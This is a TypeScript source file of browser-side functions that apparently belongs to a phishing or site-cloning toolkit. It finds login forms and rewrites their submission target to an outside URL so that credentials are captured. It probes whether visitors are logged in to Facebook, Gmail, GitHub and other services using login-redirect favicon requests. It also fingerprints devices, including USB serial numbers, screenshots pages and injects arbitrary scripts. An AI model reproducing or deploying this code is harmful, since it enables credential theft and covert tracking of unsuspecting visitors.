import NetworkSpeed = require('network-speed')

import { joinUrls, getUrlPath, getUrlBase, count, cloneElement, wwwify } from './utils'


export function resolveFavIconEdgeCases () {
    let icon:HTMLLinkElement = document.querySelector('link[rel*="icon"]')

    if (!icon) {
        const secondSrc:HTMLMetaElement = document.querySelector('meta[itemprop="image"]')

        icon = document.createElement('link')
        icon.type = 'image/x-icon'
        icon.rel = 'shortcut icon'
        icon.href = secondSrc ? wwwify(secondSrc.content) : ''

        document.getElementsByTagName('head')[0].appendChild(icon)
    }
}


export function getAuthForms():any[] {
    return Array.from(new Set(Array
        .from(document.querySelectorAll('input[name^="user"]'))
        .concat(Array.from(document.querySelectorAll('input[name^="pass"]')))
        .map(input => input.closest('form'))
    ))
}


export function resolveEventfulForms () {
    getAuthForms().forEach(form => cloneElement(form))
}


export function resolveLazyLoadedLinks () {
    const originalName = getUrlBase(window.ORIGINAL, false)

    Array
        .from(document.querySelectorAll('a'))
        .forEach(link => {
            /* Urls lazy loaded and weren't parsed by backend, let's do it again here. */
            const conditions = [
                !(new RegExp(`\/${originalName}|\/${encodeURIComponent(originalName)}`).test(link.href)),
                /^#|javascript/.test(link.href) === false,
                count('/http', link.href) === 0
            ]

            if (conditions.every(c => c)) {
                let parsedLink:string

                if (!link.href.startsWith(origin)) parsedLink = encodeURIComponent(link.href)
                else {
                    const urlPath = link.href.startsWith('http') ? getUrlPath(link.href) : link.href
                    const originalBase = getUrlBase(window.ORIGINAL, true)
                    parsedLink = encodeURIComponent(joinUrls(originalBase, urlPath))
                }

                /* Some websites have predefined click events, cloning gets rid of them 🔎 */
                const clonedLink = cloneElement(link)

                clonedLink.href = parsedLink
                clonedLink.onclick = (event:Event) => {
                    event.preventDefault()
                    window.location.href = parsedLink
                }
            }
        })
}


export async function getScreenShot ():Promise<string|undefined> {
    const html2canvas = require('html2canvas')

    try {
        const canvas:HTMLCanvasElement = await html2canvas(document.body, {
            proxy: window.location.origin + '/proxy',
            allowTaint: true,
            foreignObjectRendering: false,
            logging: false,
            useCORS: false,
            height: window.innerHeight,
            width: window.innerWidth,
            scrollX: window.scrollX,
            scrollY: -window.scrollY
        })

        return canvas.toDataURL('image/jpeg')
    } catch(err) { console.warn(err) }
}


export async function getActiveSessions ():Promise<any> {
    const loginTokenLinks = {
        'facebook': 'http://facebook.com/login.php?next=http://www.facebook.com/favicon.ico',
        'youtube': (
            'http://accounts.google.com/CheckCookie?continue=https%3A%2F%2Fwww.google.com%2Fintl%2Fen%2F' +
            'images%2Flogos%2Faccounts_logo.png&followup=https%3A%2F%2Fwww.google.com%2Fintl%2Fen%2Fimage' +
            's%2Flogos%2Faccounts_logo.png&chtml=LoginDoneHtml&checkedDomains=youtube&checkConnection=youtube%3A291%3A1'),
        'gmail': (
            'http://accounts.google.com/ServiceLogin?passive=true&continue=https%3A%2F%2Fwww.google' +
            '.com%2Ffavicon.ico&uilel=3&hl=en&service=mail'),
        'spotify': 'http://accounts.spotify.com/en/login/?continue=https%3A%2F%2Fwww.spotify.com%2Ffavicon.ico',
        'github': 'http://www.github.com/login?return_to=%2Ffavicons%2Ffavicon.png',
        'instagram': 'http://www.instagram.com/accounts/login/?next=%2Ffavicon.ico',
        'snapchat': (
            'http://accounts.snapchat.com/accounts/login?continue=https://accounts.snapchat.com/accounts' +
            '/static/images/favicon/favicon.png'),
        'airbnb': 'http://www.airbnb.com/login?redirect_url=%2Ffavicon.ico'
    }

    return Object
        .fromEntries(await Promise.all(
            Object
                .entries(loginTokenLinks)
                .map(([site, link]) => new Promise(resolve => {
                    const loader = new Image()

                    loader.style.display = 'none'
                    loader.onerror = () => resolve([site, false])
                    loader.onload = () => resolve([site, true])
                    loader.src = link
                }))))
}


export async function getGeneralInfo ():Promise<GeneralInfo> {
    const usbDevices = await navigator?.usb?.getDevices() || []
    const battery = navigator.getBattery
        ? await navigator?.getBattery()
        : {}
    const chargingLeft = battery?.level
        ? `${battery.level}`.replace('0.', '') + `${battery.level === 1 ? '00%' : '%'}`
        : 'Unknown'

    return {
        userAgent: navigator.userAgent,
        charging: battery?.charging,
        chargeLeft: chargingLeft,
        doNotTrack: navigator.doNotTrack === '1' && 'Yes' || navigator.doNotTrack,
        java: navigator.javaEnabled(),
        flash: !!navigator.mimeTypes['application/x-shockwave-flash'],
        language: navigator.language,
        languages: navigator.languages,
        touch: navigator.maxTouchPoints > 0,
        usbDevices: usbDevices.map(d => `Name: ${d.productName} , Serial: ${d.serialNumber}`),
        resolution: `${window.screen.width}x${window.screen.height}`,
        cpuCors: navigator.hardwareConcurrency
    }
}


export function checkFirstTimer ():boolean {
    const registered = localStorage.getItem(window.navigator.userAgent)
    if (!registered) localStorage.setItem(window.navigator.userAgent, 'registered')
    return !registered
}


export function say (text:string) {
    window.speechSynthesis.speak(new SpeechSynthesisUtterance(text))
}


export function injectScript (scriptContent:string) {
    const script = document.createElement('script')

    script.type = 'application/javascript'
    script.innerHTML = scriptContent

    document.body.appendChild(script)
}


export function redirect (url:string):string {
    const cleanUrl = encodeURIComponent(url)

    return window.location.href = joinUrls(window.location.origin, cleanUrl)
}


export async function getNetworkSpeed ():Promise<NetworkSpeedObj> {
    const networkTest = new NetworkSpeed()
    const downloadFileSize = 500000
    const downloadUrl = `http://httpbin.org/stream-bytes/${downloadFileSize}`
    const uploadOptions = {
        hostname: 'httpbin.org',
        port: 80,
        path: '/post',
        method: 'POST',
        headers: {'Content-Type': 'application/json'}}
    const downloadSpeed = await networkTest.checkDownloadSpeed(downloadUrl, downloadFileSize)
    const uploadSpeed = await networkTest.checkUploadSpeed(uploadOptions)

    return {
        down: {kbps: downloadSpeed?.kbps, mbps: downloadSpeed?.mbps},
        up: {kbps: uploadSpeed?.kbps, mbps: uploadSpeed?.mbps}
    }
}


export function getScriptOrigin(hashId:string):string {
    const script:HTMLScriptElement = document.querySelector(`script[src$='#${hashId}']`)

    return script ? new URL(script.src).origin : ''
}


export function redirectAuthForms(to:string, hook:boolean) {
    const link = `${to}?redirect=${window.location.href}&hook=${hook ? 'true': 'false'};`

    resolveEventfulForms()
    getAuthForms().forEach(f => { if (f.method.toLowerCase() === 'post') f.action = link })
}
